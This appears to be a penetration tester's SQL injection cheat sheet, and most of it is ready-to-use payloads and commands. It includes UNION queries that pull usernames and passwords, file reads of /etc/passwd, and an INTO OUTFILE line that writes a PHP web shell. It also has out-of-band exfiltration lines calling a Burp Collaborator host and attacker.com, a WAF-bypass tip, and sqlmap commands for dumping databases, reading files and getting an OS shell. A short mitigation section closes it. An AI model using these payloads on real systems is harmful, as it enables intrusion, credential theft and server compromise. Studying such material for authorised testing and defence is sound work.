# SQL Injection

### Types of SQL Injections

* `In-band` SQL injection, and it has two types: `Union Based` and `Error Based`.
  * Output of both the intended and the new query may be printed directly on the front end, and we can directly read it.
* `Blind` SQL injection, and it also has two types: `Boolean Based` and `Time Based`.
  * We may not get the output printed, so we may utilize SQL logic to retrieve the output character by character.
* `Out-of-band` SQL injection
  * We may not have direct access to the output whatsoever, so we may have to direct the output to a remote location, 'i.e., DNS record,' and then attempt to retrieve it from there.

### Detect SQL Injection Vulnerabilities&#x20;

* Injection Characters:  `'` , `"`, `#`, `;`, `)` , `—` , `%27`, `%22`, `%23`, `%3B`, `%29`  <sup><sub>(Note: In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at the end (-- -), to show the use of a space character.)<sub></sup>
* SQL-specific syntax(ASCII(97)), `OR 1=1` , `'  or '1'='1`
* Trigger time delays, OAST payloads to trigger out-of-band interaction&#x20;

### Second-Order SQL injection&#x20;

* First-order SQL injection arises where the application takes user input from an HTTP request&#x20;
* Second-order (stored SQLi), takes user input from an HTTP request and stores it for future use.
* The DB when fetching from stored values might not perform any additional sanitization and the attacker will be able to see output in another page.
* Payload injected in a particular HTTP Request, but the effect is not visible in the same response but somewhere else within the application where this query is processed and details are retrieved.&#x20;

### Retrieving Hidden Data&#x20;

* Use comments syntax to change the logic (`'—` )&#x20;
* Use `' OR 1=1--` , `'+OR+1=1--`  <sup><sub>(should end with space character)<sub></sup>

### &#x20;Subverting Application Logic&#x20;

* In case of username and password -> changing logic to only check the username and ignore the password&#x20;

### Retrieving Data from other Database Tables&#x20;

* Use `UNION` keyword&#x20;
* UNION Attacks - retrieve data from other tables -> appends one or more queries to original query

#### Requirements&#x20;

* Individual queries must have the same number of columns&#x20;
* Data types in each column must be compatible&#x20;

### Determine the Number of Columns being Displayed using `ORDER BY`&#x20;

* `'+ORDER+BY+1--`  <sup><sub>(keep incremeting the value)<sub></sup>
* `'+UNION+SELECT+NULL,NULL--` <sup><sub>(append more<sub></sup> <sup><sub> </sup><sup><sub>`NULL`<sub></sup> <sup><sub> </sup><sup><sub>if required)<sub></sup>&#x20;
* Reason for using NULL is because it should be compatible with the data types&#x20;

### Determine the Data Type of Column&#x20;

* `'+UNION+SELECT+'A',NULL,NULL--`&#x20;
* Keep changing the position of string and Increase or decrease NULL values

### Retrieving Multiple Values within Single Column&#x20;

* Retrieve multiple values within this single column by concatenating the values together
* `'+UNION+SELECT+username+||+'~'+||+password+FROM+users--`&#x20;
* eg: oracle database uses `||` for string concatenation -> change accordingly&#x20;

### Examining Database Details&#x20;

* Depending on DB version query changes&#x20;
* For Oracle - requires `FROM` keyword as a must
* Use Burp SQL injection cheat sheet

### Reading Files <a href="#reading-files" id="reading-files"></a>

* We can start looking for what privileges we have with that user.
  * `SELECT super_priv FROM mysql.user`
  * `SELECT grantee, privilege_type FROM information_schema.user_privileges`
* If  `FILE` privilege is listed for our user, enables us to read files. <sup><sub>(eg for MySQL)<sub></sup>
* `SELECT LOAD_FILE('/etc/passwd');`  <sup><sub>(Might need to provide full path)<sub></sup>
* Example Payload: `' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` , `' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`&#x20;

### Writing Files <a href="#writing-files" id="writing-files"></a>

* To be able to write files to the back-end server using a MySQL database, we require three things:
  1. User with `FILE` privilege enabled
     1. `SELECT super_priv FROM mysql.user`
     2. `SELECT grantee, privilege_type FROM information_schema.user_privileges`
  2. MySQL global `secure_file_priv` variable not enabled
     1. `SHOW VARIABLES LIKE 'secure_file_priv';`  <sup><sub>(The<sub></sup> [<sup><sub>secure\_file\_priv<sub></sup>](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) <sup><sub>variable is used to determine where to read/write files from.)<sub></sup>
     2. `SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"`
  3. Write access to the location we want to write to on the back-end server
* `SELECT * from users INTO OUTFILE '/tmp/credentials';`
* `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`&#x20;
* `select '<?php system($_REQUEST[0]); ?>' into outfile '/var/www/html/shell.php'-- -`

### Blind SQL Injection Detection&#x20;

* Trigger a detectable difference in the application's response depending on the true/false of a single condition.&#x20;
* Trigger a time delay in the processing of the query&#x20;
* Trigger an out-of-band network interaction, using OAST techniques.&#x20;

### Exploiting Blind SQL Injection by Triggering Conditional Responses

* Works only if there is some kind of difference in the response
* eg: trackingID cookie&#x20;
* `xyz' AND '1'='1 , xyz' AND '1'='2`&#x20;
* `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`&#x20;
* `SUBSTRING` method used is different depending on DB version&#x20;
* make use of `length()` and `substring()`
* In intruder there is an option grep-match - provide the difference in response message&#x20;

### Exploiting Blind SQL Injection by  Inducing Conditional Responses by Triggering SQL Errors&#x20;

* Works only if error handling mechanism is not defined
* `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`&#x20;
* `xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`&#x20;
* Here if the condition is true it will throw an error for division by zero&#x20;
* use `substring()` and `length()` to know about the details that is to be fetched&#x20;
* In intruder look for 500 status code&#x20;

### Exploiting Blind SQL Injection by Triggering Time Delays&#x20;

* If error handling mechanism is defined
* Triggering time delays conditionally, depending on an injected condition&#x20;
* `'; IF (1=2) WAITFOR DELAY '0:0:10'--`&#x20;
* `'; IF (1=1) WAITFOR DELAY '0:0:10'--` (triggers a delay of 10 seconds)&#x20;
* Time delay function varies depending on DB version
* In resource pool change max concurrent requests to 1 and in results -> column -> response received/completed -> look for the number matching the time delay&#x20;

### Exploiting Blind SQL Injection using Out-of-Band (OAST) techniques

* When SQL queries are not executed synchronously
* Make use of burp collaborator&#x20;
* Cmd varies according to version of DB&#x20;
* If sql query is executed asynchronously -> use this method&#x20;
* `'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`&#x20;
* `x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>+%25remote%3b]>'),'/l')+FROM+dual--`&#x20;
* `x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>+%25remote%3b]>'),'/l')+FROM+dual--`&#x20;
* `LOAD_FILE(CONCAT('\\',@@version,'.attacker.com\README.txt'))`

### Bypass WAF using Hackvertor&#x20;

* Encode -> dec\_entities/hex\_entities

## SQLMAP Techniques

* The technique characters `BEUSTQ` refers to the following:
  * `B`: Boolean-based blind <sup><sub>(<sub></sup><sup><sub>`AND 1=1`<sub></sup><sup><sub>)<sub></sup>
  * `E`: Error-based <sup><sub>(<sub></sup><sup><sub>`AND GTID_SUBSET(@@version,0)`<sub></sup><sup><sub>)<sub></sup>
  * `U`: Union query-based <sup><sub>(<sub></sup><sup><sub>`UNION ALL SELECT 1,@@version,3`<sub></sup><sup><sub>)<sub></sup>
  * `S`: Stacked queries <sup><sub>(<sub></sup><sup><sub>`; DROP TABLE users`<sub></sup><sup><sub>)<sub></sup>
  * `T`: Time-based blind <sup><sub>(<sub></sup><sup><sub>`AND 1=IF(2>1,SLEEP(5),0)`<sub></sup><sup><sub>)<sub></sup>
  * `Q`: Inline queries <sup><sub>(<sub></sup><sup><sub>`SELECT (SELECT @@version) from`<sub></sup><sup><sub>)<sub></sup>

## SQL Comands

### Basic

* `sqlmap -r req.txt --batch --dump`
* `sqlmap -r req.txt --batch --dump --level 5 --risk 3`&#x20;
* `sqlmap -r req.txt --banner --current-user --current-db --is-dba`
* `sqlmap -r req.txt --tables -D <DB-Name>`
* `sqlmap -r req.txt -D <DB-Name> -T <Table-Name> --batch --dump`
* `sqlmap -r req.txt --batch --dump --level 5 --risk 3 --random-agent --tamper=between --technique=t`  <sup><sub>(we can specify these techniques with<sub></sup> <sup><sub> </sup><sup><sub>`--technique=BEUST`<sub></sup><sup><sub>)<sub></sup>

### Prefix/Suffix

* `sqlmap -r req.txt --prefix="%'))" --suffix="-- -" --batch --dump`&#x20;

### UNION Columns

* `sqlmap -r req.txt --technique=U --union-cols=5 --dump`  <sup><sub>(we can specify these techniques with<sub></sup> <sup><sub> </sup><sup><sub>`--technique=BEUST`<sub></sup><sup><sub>)<sub></sup>

### Search Database, Column, Table Names

* `sqlmap -r req.txt --search -C style --batch`&#x20;

### Bypass Protections

* `sqlmap -r req.txt --csrf-token=<token-parameter-name> --batch --dump`
* `sqlmap -r req.txt --randomize=<random-parameter-name> --batch --dump`
* `sqlmap -r req.txt --random-agent --batch --dump`&#x20;
* `sqlmap -r req.txt --tamper=between --batch --dump`

### Read Files

* `sqlmap -r req.txt --file-read "/var/www/html/flag.txt" --batch`&#x20;

### OS Exploitation

* `sqlmap -r req.txt --os-shell --technique=E --batch`  <sup><sub>(we can specify these techniques with<sub></sup> <sup><sub> </sup><sup><sub>`--technique=BEUST`<sub></sup><sup><sub>)<sub></sup>

## Mitigation

* Input Sanitization
* Input Validation
* Minimum User Privileges
* Web Application Firewall
* Parameterized Queries
  * **What it is:** A query with placeholders (`?`, `$1`, `%s`) where values are bound separately.
  * **How it works:** The application sends the SQL logic and the data as two distinct parts.
  * **Why it matters:** Prevents SQL injection because user input is treated strictly as data, not executable SQL.
  * **Performance:** May or may not reuse compiled query plans depending on the driver/database.
  * **Best use:** Everyday coding for safety and clarity when handling user input.
* Prepared Statements
  * **What it is:** A query that the database engine compiles once and stores for reuse.
  * **How it works:** SQL logic is parsed, validated, and optimized first; parameters are fed in later.
  * **Why it matters:** Faster for repeated queries since the plan is reused, and also safe against SQL injection.
  * **Performance:** Always benefits from precompilation when executed multiple times.
  * **Best use:** High‑performance scenarios where the same query runs many times with different values.
